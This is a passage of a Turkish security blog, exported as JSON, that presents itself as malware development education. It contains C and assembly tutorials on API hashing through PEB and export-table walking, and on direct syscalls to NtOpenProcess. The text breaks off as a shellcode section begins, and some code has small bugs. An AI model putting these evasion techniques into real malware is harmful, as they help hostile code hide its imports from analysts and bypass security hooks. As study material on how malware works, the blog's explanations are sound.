{"/about/":{"data":{"":"\nMerhabalar efenimm, bloguma hoşgeldiniz.\nBen Berkay ancak kısaca bekoo olarak biliniyorum ve 18 yaşındayım. Yaklaşık 4 yıldır siber güvenlik alanında kendimi geliştirmeye çalışıyorum. Bu 4 yıllık sürecimde Reverse Engineering, Malware Analysis ve Malware Development alanlarında kendimi geliştirmekteyim.\nBu blogta öğrendiğim konuları burada paylaşıyorum. Özellikle ilgilendiğim alanların Türkçe kaynakları kısıtlı olduğunu bildiğimden, blog sayfama ağırlık vermeye özen gösteriyorum.\nİçeriklerim etik kısmına da değinmek istiyorum. İçeriklerim illegal amaç güdmemekte olup, okuyucu hiçbir şekilde illegal aktivitelere teşvik etmemektedir. Eğer bu blogta anlatılan konuları gerçek senaryolarda kullanırsanız, sorumluluk sizin üzerine ait olacaktır. Buradaki nihai amacım sadece kaynak sağlamaktır.\nUmarım içeriklerim işinize yarar. Eğer bloglarımda kafanıza takılan bir şey olursa veya özellikle hatalı bilgi verdiğimi düşündüğünüz bir kısım fark ederseniz, lütfen benimle iletişime geçmekten çekinmeyin. Kafanızda beliren soruları yanıtlayabiliyorsam, yanlış olduğum yerlerde de sizin geri bildiriminizle doğruyu öğrenmek benim için de çok değerli olacaktır.\nİyi araştırmalar dilerim."},"title":"About"},"/blog/":{"data":{"":"\rRSS Feed "},"title":"Blogs"},"/docs/":{"data":{"":"Bu sitede, dökümanlar için iki kategoride paylaşım yapılmaktadır:\nMalware Development\rWindows Kernel Development"},"title":"Documentation"},"/docs/malware-dev/":{"data":{"":"Malware Development ile ilgili konuları incelemek için aşağıdaki bölümlere göz atabilirsiniz:\nMalware Resurrection\rFile Spoofing\rAPI Hashing\rDirect Syscalls\rNTAPI Injection\rDLL Injection\rShellcode Injection"},"title":"Malware Development"},"/docs/malware-dev/api-hashing/":{"data":{"":"","api-hashing-nedir#API Hashing Nedir?":"","apinin-adresini-bulma#API’nin Adresini Bulma":"","eat-export-address-table-ve-iat-import-address-table-nedir#EAT (Export Address Table) ve IAT (Import Address Table) Nedir?":"","modülün-base-addressini-bulma#Modülün Base Address’ini Bulma":"","pe-portable-executable-yapısı-nedir#PE (Portable Executable) Yapısı Nedir?":"","references#References":"Merhabalar. Bu yazıda, maldev alanındaki API Hashing yöntemini ele alacağım.\nPE (Portable Executable) Yapısı Nedir? Her şeyden önce PE (Portable Executable) yapısını anlamanın gerekli olduğunu düşünüyorum çünkü bu tekniğimiz tamamen bu yapı üzerine.\nPE, Windows işletim sistemlerinde 32 ve 64 bit sürümlerde ve UEFI ortamlarda kullanılan executable dosyalar, object kodlar, DLL’ler ve diğerleri için bir dosya biçimidir. PE, Windows İşletim sistemi loader’in yürütülmek istenilen kodu yönetmesi için gereken veri yapıları içermektedir.\nBir PE dosyası, dinamik linker’a (dynamic linker) yürütülebilir dosyanın dosya belleğin nasıl eşleceğini ve çalıştırılacağını belirten bir dizi başlık ve bölümden oluşur. Bu başlıklar ve bölümler, işletim sisteminin dosyayı doğru şekilde yüklemesine ve çalıştırmasına olanak tanır.\nPE yapısında bulunan bazı önemli başlıklar şunlardır:\nDOS Header (IMAGE_DOS_HEADER): Bu başlık, eski MS-DOS işletim sistemleri tarafından yürütülebilir dosyanın tanınması için gerekli minimum bilgileri içerir.\nDOS Stub: Bu, yürütülebilir bir dosyanın başlangıcında bulunan ve DOS işletim sistemi tarafından tanınması için gereken minimum bilgileri içerir. Bu, dosyanın yürütülebilir olup olmadığını belirlemek için kullanılır.\nPE Header (IMAGE_NT_HEADERS): Bu başlık, PE formatına özgü önemli bilgileri içerir. İşletim sisteminin dosyayı doğru şekilde yüklemesi ve çalıştırması için gerekli olan dosya boyutu, giriş noktası adresi, isteğe bağlı DLL’ler ve diğer bilgiler buradadır.\nFile Header (IMAGE_FILE_HEADER): Bu başlık, dosyanın genel bilgilerini içerir. Dosyanın mimarisi, dosya türü, bölümler ve diğer bilgiler burada bulunur.\nOptional Header (IMAGE_OPTIONAL_HEADER): Bu başlık, dosyanın yüklenmesi ve çalıştırılması için gerekli olan bilgileri içerir. Dosyanın mimarisi, dosya türü, bölümler ve diğer bilgiler burada bulunur.\nEAT (Export Address Table) ve IAT (Import Address Table) Nedir? EAT ve IAT, PE dosyalarında bulunan iki önemli tablodur. Bu tablolar, dosyanın yürütülmesi sırasında işletim sistemi tarafından kullanılan fonksiyonların adreslerini ve adlarını içerir.\nEAT (Export Address Table): Dışa Aktarım Adres Tablosu olan EAT, bir PE dosyasının dışarı aktardığı fonksiyonların adreslerini ve adlarını içeren bir tablodur. Bu tablo, dinamik linker’ın (dynamic linker) yürütülebilir dosyayı yüklerken ve çalıştırırken hangi fonksiyonların kullanılabileceğini belirlemesine yardımcı olur. Bunu özellikle aklınızda tutun çünkü ileride bu tablo üzerinde işlem yapacağız.\nIAT (Import Address Table): İçe Aktarım Adres Tablosu olan IAT, bir PE dosyasının diğer PE dosyalarından içe aktardığı fonksiyonların adreslerini ve adlarını içeren bir tablodur. Aynı şekilde bu tabloda dinamik linker’ın yürütülebilir dosyayı yüklerken ve çalıştırırken hangi fonksiyonların içe aktarılması gerektiğini belirlemesine yardımcı olur.\nAPI Hashing Nedir? API Hashing, bir API fonksiyonunun adını veya diğer tanımlayıcı özelliklerini bir hash değerine dönüştüren bir tekniktir. Bu hash değeri, fonksiyonun kimliğini temsil etmek için kullanılır. API’ların adlarını ve adreslerini gizlemek için kullanılabilir.\nÖrneğin, MessageBoxA fonksiyonunu içeren bir projeyi derleyip çalıştırdığımızı düşünelim. Projemizde MessageBoxA kullandığımız için derleme sırasında derleyici (compiler), MessageBoxA API’sinin adresini Import Address Table (IAT) tablosuna ekleyecektir. Bu, programı çalıştırdığımızda MessageBoxA API’sinin bu adresten erişilebileceği anlamına gelir.\nAncak, MessageBoxA’nın adresini gizlemek istiyorsak ne yapabiliriz? İşte burada API hashing devreye girer. Malware’i analiz eden bir kişi, malware’da kullanılan API’ları IAT içerisinde rahatlıkla görebilir. Bu nedenle, projemizde bu API’lara farklı isimler vererek ve ardından bu farklı isimleri hashleyerek IAT’a eklersek, analiz eden kişi bu API’ları kolayca göremez. Temelde, API hashing yöntemi budur: İlgili API’nin adını değiştirip hashleyerek ve sonra IAT tablosuna ekleyerek gizlemek.\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } int main() { DWORD hash_value = CalculateHash(\"CreateThread\"); printf(\"CreateThread: 0x%00x\\n\", hash_value); getchar(); return 0; } Yukarıdaki örnekte, verilen API’in hash değerini hesaplayan basit bir kod parçası hazırlanmıştır. İlk olarak API’nin adı alınır ve hesap yapacak CalculateHash fonksiyonuna gönderilir.\nFonksiyon içerisinde hash adında ve 0x99 değer tutan bir DWORD değişkeni oluşturduk. Bu değer, hesaplamanın başlangıç ​​noktası olarak kullandık.\nDaha sonra bir döngü başlattık. Bu döngüde, mevcut hash değerini 0xab10f29f sabit değeri ile çarpılır. Bu, her karakterin karma değerine katkısını artırmaya yardımcı olur. Mevcut karakterin değeri, çarpılan değere eklenir. Son olarak ise sonuç, 0xffffff değeri ile bitsel AND işlemine tabi tutulur. Bu, karma değerinin 32 bitlik bir tamsayı olarak kalmasını sağlar. Bu basit bir projedir ve ilerdeki süreçlerde bu fonksiyonu kullanacağız.\nModülün Base Address’ini Bulma Şimdi, API’nin adresini bulma işlemine geçeceğiz. Adım adım WinDbg kullanarak, işlem modüllerini ve API’ları nasıl sıralandığını ve PE (Portable Executable) yapısını nasıl görebileceğimizi öğreneceğiz. Ardından, bu bilgileri C projesine uygulayacağız.\nİlk olarak, çalışan bir işlemin PEB yapısını inceleyerek, işlemin modüllerinin taban adreslerine göz atacağız. Belirtmek gerekirse, PEB, bir işlemin çalışma zamanı bilgilerini içeren bir yapıdır. Bu yapı, işlemin modüllerinin taban adreslerini, heap ve stack bilgilerini, çevresel değişkenlerini ve diğer bilgileri içerir.\n64 bit işlemlerde, PEB, Thread Environment Block bloğundan 0x60 ofsette bulunur. TEB, yürütülen iş parçacığının çalışma zamanı bilgilerini içeren bir yapıdır. TEB yapısı, GS segment kaydı tarafından işaretlenir. Dolayısıyla, PEB yapısına GS segment kaydı ile GS:[0x60] adresinden erişilebilir.\nŞimdi, cmd.exe’yi çalıştıralım ve WinDbg kullanarak analize başlayalım:\nİlk olarak dt komutu ile TEB’in yapısını inceleyerek başlayabiliriz:\nBurada dikkatimizi çeken kısım +0x060 ProcessEnvironmentBlock : 0x000000fc4bacf000 _PEBolması yeterlidir. Yukarıda TEB ve PEB’ten bahsetmiştik ve burada TEB içerisinde PEB’in adresini görmekteyiz. Şimdi ise bu PEB’in adresi ile bu yapıya bir göz atalım:\nYakından ilgili process’in PEB yapısını böylece görmüş olduk. Burada bizi ilgilendiren kısım +0x018 Ldr: 0x00007ffe`c5c153e0 _PEB_LDR_DATA olacaktır. Bu yapı, yüklenen modüllerin listesini içerir. Şimdi ise bu yapıya bir göz atalım:\nBu yapıya göz attığımızda üç farklı liste olduğunu görmekteyiz. Bu listeler, yüklenen modüllerin listesini temsil eder. Bu listelerin içerisinde bulunan yapılar ise LDR_DATA_TABLE_ENTRY yapısına aittir. Bu yapı, yüklenen modülün bilgilerini içerir.\nBu listeleri tanımadan önce LIST_ENTRY yapılarını anlamamiz lazım:\nFlink: İlgili yapıyı işaret eden bir sonraki yapıdır. Blink: İlgili yapıyı işaret eden bir önceki yapıdır. Şimdi ise listeleri tanıyalım:\nInLoadOrderModuleList: Modüllerin yüklenme sırasını temsil eder.\nInMemoryOrderModuleList: Modüllerin belleğe yüklenme sırasını temsil eder.\nInInitializationOrderModuleList: Modüllerin başlatılma sırasını temsil eder.\nBu listelerden ana odağımız InLoaderOrderModuleList olacaktır. Bu listenin modüllerin yüklenme sırasını temsil ettiğinden bahsetmiştik. Şimdi ise bu liste üzerinde işlem yaparak yüklenen modülleri tek tek göz atacağız.\nİlk olarak InLoadOrderModuleList yapısındaki 0x000002c0`f1e23690 adres, yüklenen ilk modülün adresidir. Bu adresi kullanarak ilk yüklenilen modüle göz atabiliriz:\nİlk yüklenen modülün detaylı bilgilerini fotoğrafta görülebileceği üzere yakından görebiliyoruz. İlk yüklenen modül cmd.exe adıyla ilgili executable dosyanın modülü olduğunu görmekteyiz. Dllbase, ilgili modülün base addressini içerir. BaseDllName ise yüklenen modülün ismi. Bunları görmemiz yeterlidir araştırma için.\nAraştırmalara devam etmek için bir sonraki yüklenen modüle geçebiliriz:\nYüklenen diğer modülün ntdll.dll olduğunu görmekteyiz. Bu şekilde yüklenen tüm modülleri tek tek inceleyebiliriz. Son olarak diğer modüle de göz atalım:\nDiğer yüklenen modüle göz attığımızda ise kernel32.dll olduğunu görmekteyiz.\nŞimdi ise odağımızı C projemize çevireceğiz. Bu öğrendiklerimizi ise C projesine dökeceğiz.\nIDE içerisinde bu yapılar tanımlı olmadığı için elle kendimiz tamamlamamız gerekmektedir. Şimdi ise kodlamaya geçebiliriz:\n#include \"utils.h\" DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } DWORD CalcModuleHash(LDR_MODULE* ModuleLink) { char* ModuleName[64]; size_t counter = 0x0; while (ModuleLink-\u003eBaseDllName.Buffer[counter] \u0026\u0026 counter \u003c sizeof(ModuleName) - 1) { ModuleName[counter] = (char)ModuleLink-\u003eBaseDllName.Buffer[counter]; counter++; } ModuleName[counter++] = 0; return CalculateHash((char*)CharLowerA(ModuleName)); } HMODULE GetModuleBaseAddress(DWORD Hash) { HMODULE ModuleBaseAddress = NULL; INT_PTR PEB\t= __readgsqword(0x60);\t// PEB'in offseti INT_PTR LDR\t= 0x18;\t// PEB içerisindeki LDR'in offseti INT_PTR FlinkOffset\t= 0x10;\t// InLoadOrderModuleList'in offseti INT_PTR PEB_LDR_DATA = *(INT_PTR*)(PEB + LDR);\t// PEB içerisinden LDR'e ulaş INT_PTR FirstFlink = *(INT_PTR*)(PEB_LDR_DATA + FlinkOffset); // LDR içerisinden InLoadOrderModuleList yapısına ulaş LDR_MODULE* LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)FirstFlink; do { /* Buradaki döngü, process'e yüklenen tüm modül listesi üzerinde işlem yapar. Yüklenen her modülün base address'i ve hash değeri alınır ve kontrol yapılır. */ LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)LDR_DATA_TABLE_ENTRY-\u003eInLoadOrderModuleList.Flink; if (LDR_DATA_TABLE_ENTRY-\u003eBaseAddress != NULL) { if (CalcModuleHash(LDR_DATA_TABLE_ENTRY) == Hash) { break; } } } while (FirstFlink != (INT_PTR)LDR_DATA_TABLE_ENTRY); ModuleBaseAddress = (HMODULE)LDR_DATA_TABLE_ENTRY-\u003eBaseAddress; return ModuleBaseAddress; } Bu kod parçasında, öncelikle CalculateHash fonksiyonu ile API’nin hash değeri hesaplanmaktadır. Daha sonra CalcModuleHash fonksiyonu, bir modülün ismini alır ve bu ismin hash değerini hesaplar. İşlem sırasında modül ismi küçük harfe dönüştürülür ve her karakterin ASCII değeri ile önceki hash değeri kullanılarak yeni bir hash değeri hesaplanır.\nSon olarak, GetModuleBaseAddress fonksiyonu, verilen bir hash değeriyle eşleşen bir modül bulur ve bu modülün başlangıç adresini döndürür. Bunun için, işlem yüklenen modül listesi üzerinde döngü yapar ve her bir modülün hash değeri CalcModuleHash ile hesaplanarak kontrol edilir. Eşleşme bulunduğunda, ilgili modülün başlangıç adresi döndürülür.\nAncak bu kod parçasını kullanmamıza gerek yok. Zaten bunları yapan hazır API’lar bulunmaktadır.\nAPI’nin Adresini Bulma Base Address’i bulduktan sonra API’in adresini bulmamız gerekiyor. Bunun için ihtiyacımız olan şey, IMAGE_EXPORT_DIRECTORY yapısıdır. Bu yapı, Export Address Table’ın (EAT) adresini içerir. Bu yapıda içeren bazı önemli alanlar şunlardır:\nNumberOfFunctions: Export edilen fonksiyonların sayısı AddressOfFunctions: Export edilen fonksiyonların adreslerinin bulunduğu tablonun adresi AddressOfNames: Export edilen fonksiyonların isimlerinin bulunduğu tablonun adresi Windbg’a dönelim ve ntdll’in EAT tablosunu bularak başlayalım:\nntdll’in yüklü olduğu adresin 00007ffe`c5a90000 olduğunu görebiliyoruz. Şimdi bu adresten IMAGE_DOS_HEADER yapısına ulaşalım:\nIMAGE_DOS_HEADER yapısının adresini bulduktan sonra IMAGE_NT_HEADERS yapısına ulaşacağız.\nBu yapının adresini bulmak için IMAGE_DOS_HEADER yapısının e_lfanew’in hex değeri, ntdll’in adresine ekleyerek elde edebiliriz. Böylece IMAGE_NT_HEADERS yapısına ulaşabiliriz:\nDaha sonra araştırmamıza _IMAGE_OPTIONAL_HEADER64’a (0x18) ulaşarak devam edeceğiz:\n0:004\u003e dt _IMAGE_OPTIONAL_HEADER64 00007ffe`c5a90000+0xe0+0x18\rntdll!_IMAGE_OPTIONAL_HEADER64\r+0x000 Magic : 0x20b\r+0x002 MajorLinkerVersion : 0xe ''\r+0x003 MinorLinkerVersion : 0x1e ''\r+0x004 SizeOfCode : 0x130000\r+0x008 SizeOfInitializedData : 0xe5000\r+0x00c SizeOfUninitializedData : 0\r+0x010 AddressOfEntryPoint : 0\r+0x014 BaseOfCode : 0x1000\r+0x018 ImageBase : 0x00007ff9`373b0000\r+0x020 SectionAlignment : 0x1000\r+0x024 FileAlignment : 0x1000\r+0x028 MajorOperatingSystemVersion : 0xa\r+0x02a MinorOperatingSystemVersion : 0\r+0x02c MajorImageVersion : 0xa\r+0x02e MinorImageVersion : 0\r+0x030 MajorSubsystemVersion : 0xa\r+0x032 MinorSubsystemVersion : 0\r+0x034 Win32VersionValue : 0\r+0x038 SizeOfImage : 0x216000\r+0x03c SizeOfHeaders : 0x1000\r+0x040 CheckSum : 0x21eed5\r+0x044 Subsystem : 3\r+0x046 DllCharacteristics : 0x4160\r+0x048 SizeOfStackReserve : 0x40000\r+0x050 SizeOfStackCommit : 0x1000\r+0x058 SizeOfHeapReserve : 0x100000\r+0x060 SizeOfHeapCommit : 0x1000\r+0x068 LoaderFlags : 0\r+0x06c NumberOfRvaAndSizes : 0x10\r+0x070 DataDirectory : [16] _IMAGE_DATA_DIRECTORY Dikkatimizi 0x70 offsetine yani IMAGE_DATA_DIRECTORY yapısına çekiyoruz. Bu yapı, Export Address Table’ın RVA’sı (Relative Virtual Address) gibi Import Address Table için önemli bilgileri tutar.\nIMAGE_EXPORT_DIRECTORY yapısı ise şu şekildedir:\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY; Şimdi ise bu bilgilerin ışığında API’in adresini bulmak için C projemize aşağıdaki kodu ekleyeyelim:\nPDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmiş fonksiyonlarla ilgili bilgiler için RVA'ları al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Alınan Export fonksiyonun hash değerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastır ve main'e dön if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } Bu kod parçasında, getFunctionAddressByHash fonksiyonu, verilen bir hash değeriyle eşleşen bir API’nin adresini bulur ve döndürür. Bunun için, verilen kütüphane adını yükler ve IMAGE_EXPORT_DIRECTORY yapısını kullanarak Export Address Table’ın adresini alır.\nDaha sonra bu yapıdaki adresler kullanılarak, Export edilen fonksiyonların adreslerinin bulunduğu tablo ve isimlerin bulunduğu tablo adresleri alınır. Daha sonra, bu tablolar üzerinde döngü yaparak, her bir fonksiyonun adını ve hash değerini hesaplar. Eşleşme bulunduğunda, ilgili fonksiyonun adresi döndürülür.\nKodun tamamını birleştirelim ve basitçe CreateThread API’sini çalıştıralım:\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cWindows.h\u003e typedef struct HANDLE(NTAPI* MyCreateThread)( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); DWORD getHashFromString(char* string) { size_t stringLength = strnlen_s(string, 50); DWORD hash = 0x35; for (size_t i = 0; i \u003c stringLength; i++) { hash += (hash * 0xab10f29f + string[i]) \u0026 0xffffff; } return hash; } PDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmiş fonksiyonlarla ilgili bilgiler için RVA'ları al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Alınan Export fonksiyonun hash değerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastır ve main'e dön if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } int main() { DWORD hash = getHashFromString(\"CreateThread\"); PDWORD functionAddress = getFunctionAddressByHash((char*)\"kernel32\", hash); DWORD TID = 0; HANDLE th = CreateThread(NULL, 0, NULL, NULL, 0, \u0026TID); if (th == NULL) { printf(\"Failed to create thread\\n\"); return -1; } printf(\"Thread created successfully\\n\"); CloseHandle(th); return 0; } Sonuca baktığımızda ise başarılı bir şekilde API’in adresinin alındığını ve çalıştırıldığını görmekteyiz.\nReferences EN Wikipedia - Portable Executable Tech Zealots - A Comprehensive Guide To PE Structure, The Layman’s Way Red Team Notes - Windows API Hashing in Malware Cognisys Labs - Combining Indirect Dynamic Syscalls and API Hashing "},"title":"API Hashing"},"/docs/malware-dev/direct-syscalls/":{"data":{"":"","direct-systemcall-ile-shellcode-çalıştırma#\u003cstrong\u003eDirect Systemcall ile Shellcode Çalıştırma\u003c/strong\u003e":"","direct-systemcall-yöntemi#\u003cstrong\u003eDirect Systemcall Yöntemi\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar bu yazıda Direct System Calls konusuna değineceğiz.\nSystem Call Nedir? Important\nOkuyucunun NTAPI Injection blogunda anlatılan NTAPI mekanizması, user-mode ve kernel-mode arasındaki temel farklar gibi konularda bilgisi olduğu varsayılmıştır.\nDirekt olarak tekniğe geçmeden önce syscall nedir bunu anlamamız gerekiyor.\nBir sistem çağrısı (system call), bir programın işletim sisteminden bir hizmet talep etmesinin programatik yoludur. Daha basit olarak, kullanıcı modunda (user mode) çalışan bir programın çekirdek moduna (kernel mode) geçmesini sağlayan bir komuttur. Windows gibi işletim sistemlerinde, kullanıcı modunda çalışan bir program, bir sistem çağrısı yaparak işletim sisteminin çekirdek modunda çalışan servislerine ulaşır. Bu geçiş, CPU’nun işletim sistemi tarafından yönetilen çekirdek moduna geçmesiyle gerçekleşir.\nSöz konusu Windows API olduğunda, bir user-mode program tarafından çağırılan WIN32 API’in çalıştırılması için user-mode alanından kernel-mode alana geçici geçişi (geçiş CPU anahtarı) sağlayan bir komuttur.\nKafanıza daha iyi oturması için diyagram üzerinden ilerleyelim:\nNTAPI Injection blogumu okuduysanız bu diyagram yabancı gelmeyecektir. Fakat yine de özet geçmekte fayda var.\nDiyelim ki user-mode programdan OpenProcess API’i çağırdık. Bu API’ların orijinal adresleri kernel alanından ntoskrnl.exe‘de tutulduğu için user-mode alanından kernel-mode’a yönlendirilmesi gerekiyor. Bu API’in ilk durağı kernel32.dll alanından OpenProcess olacaktır ve sonra user-mode alanın son durağı olan ntdll.dll kütüphanesine giderek NtOpenProcess haline dönüşür. Konumuzilgisi olan SYSCALL tam burada devreye giriyor. ntdll.dll’den sonra adımlar kernel alanından devam edeceği için kernel-mode alana yönlendirilmesi gerekiyor.\nSYSCALL çalıştıktan sonra ise kernel-mode alana geçiş yapılarak SSDT tablosuna yönlendirilir NtOpenProcess‘in orijinal adresi hesaplanır ve ntoskrnl.exe’den adrese yönlendirilir. Eğer SSDT tablosu hakkında bilgi sahibi olmak isterseniz SSDT bloguma göz atabilirsiniz.\nFakat yapılan bu syscall’lar direkt olarak belirsiz bir şekilde yapılmıyor. Hangi API’in çalıştırıldığı anlaşılması için her NTAPI için bir syscall numarası bulunur. Bu numaralar, işletim sistemi versiyonuna göre değişiklik gösterebilir ve genellikle kernel seviyesinde tanımlıdır. Böylece program’ın hangi API’i çalıştırmak istendiği belirlenmiş olur.\nMesela Windbg ile ntdll.dll’den NtOpenProcess’in syscall numarasına göz atabiliriz:\nBir syscall yapıldığında ssn yani syscall numarası eax’a aktarılır. Fotoğrafta eax’a aktarılan değerin 0x26 olduğunu görebiliriz.\nDirect Systemcall Yöntemi Direct Systemcall yöntemi, adından da anlaşılabileceği gibi, user-mode programlardan doğrudan syscall yapmayı içeren bir tekniktir. Bu yöntem, arada herhangi bir kütüphaneye (şemadan gördüğümüz gibi kernel32.dll vs.) gitmeden, doğrudan syscall yapılır.\nYıllar geçse de sıkılmayacağımız örnek olan NtOpenProcess’i kullanarak bir syscall örneği yapalım. Kafamıza daha iyi oturacaktır.\nAssembly Projenin Kodlanması Hatırlarsanız NTAPI Injection konusunda NtOpenProcess çalıştırmak için yapısını tanımlıyorduk. Bu yöntemle beraber projede bir .asm dosyası oluşturacağız. Bunun nedeni ise yapılan syscall’lar assembly yani daha düşük seviyede yapılır. Bu yüzden direkt olarak C kodlarıyla syscall yapamayız.\nVisual Studio’da oluşturduğumuz projeye sağ tıklayalım ve Build Dependencies \u003e Build Customizations‘a tıklayalım:\nAçılan ekrandan masm kutucuğunu işaretleyelim:\nDaha sonra bir .asm projesi oluşturalım ve oluşturulan projeye sağ tıklayıp Properties seçeneğine tıklayalım:\nProperties’e tıkladıktan sonra Excluded From Build seçeneğini No olarak işaretleyelim.\nDaha sonra oluşturduğumuz assembly dosyasını kodlayalım:\n.code My_NtOpenProcess proc mov r10,rcx mov eax,26h syscall ret My_NtOpenProcess endp end Bu kodda gördüğünüz gibi 0x26 ssn ile syscall yapıyoruz. C projemizde My_NtOpenProcess fonksiyonunu çağırdığımızda akış buraya aktarılacak.\nC Projenin Kodlanması Şimdi ise main.h adında bir header dosyası oluşturalım ve aşağıdaki kodları yapıştırın:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; extern NTSTATUS My_NtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); Artık bu yapıların ne için kullanıldığını biliyoruz. extern ile assembly projesinde oluşturduğumuz My_NtOpenProcess‘i tanımladığımıza dikkat edin.\nArtık main.c projesini kodlayabiliriz:\n#include \"main.h\" int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed with status: 0x%08x\\n\", Status); return -1; } printf(\"HandleProcess: 0x%p\\n\", HandleProcess); return 0; } NTAPI Injection konusundan sonra kodlar artık bize yabancı gelmeyecektir. Programı çalıştıralım ve sonuçlara göz atalım:\nGöründüğü gibi başarılı bir şekilde NtOpenProcess çalışıyor. Yine de arka planda neler olduğunu daha yakından görmek için Windbg kullanabiliriz:\nmain fonksiyondan My_NtOpenProcess’i çağırdığımız kısma bir bp koyalım ve adım adım neler yaptığına bir göz atalım:\nGöründüğü gibi Assembly projesinde oluşturduğumuz fonksiyona yöneliyor ve artık bu kısımdan sonra akış kernel’a yönelecek.\nYaptığımız adımın diyagramını oluşturabiliriz böylece daha iyi anlayabiliriz:\nDirect Systemcall ile Shellcode Çalıştırma Öncelikle oluşturduğumuz Assembly projesini aşağıdaki kod ile 